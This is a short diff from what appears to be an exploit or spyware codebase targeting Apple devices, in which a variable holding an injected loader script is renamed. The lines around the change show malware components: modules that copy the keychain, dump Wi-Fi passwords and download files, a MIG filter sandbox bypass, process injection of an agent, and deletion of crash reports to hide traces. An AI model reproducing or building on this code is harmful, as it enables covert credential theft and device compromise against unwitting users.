@@ -8,7 +8,7 @@ import InjectJS from "./InjectJS.js";
 import Driver from "./libs/Driver/Driver.js";
 import RemoteCall from "./libs/TaskRop/RemoteCall.js";
 import MigFilterBypassThread from "./MigFilterBypassThread.js";
-import loader_js from "!raw-loader!./loader.js";
+import loaderCode from "!raw-loader!./loader.js";
 import fileDownloaderCode from "!raw-loader!./file_downloader.js";
 import keychainCopierCode from "!raw-loader!./keychain_copier.js";
 import wifiDumpCode from "!raw-loader!./wifi_password_dump.js";
@@ -166,7 +166,7 @@ function start() {
     Sandbox.deleteCrashReports();
     Sandbox.createTokens();
 
-    let agentLoader = new InjectJS(targetProcess, loader_js, migFilterBypass);
+    let agentLoader = new InjectJS(targetProcess, loaderCode, migFilterBypass);
     let agentPid = 0;
 
     if (agentLoader.inject()) {
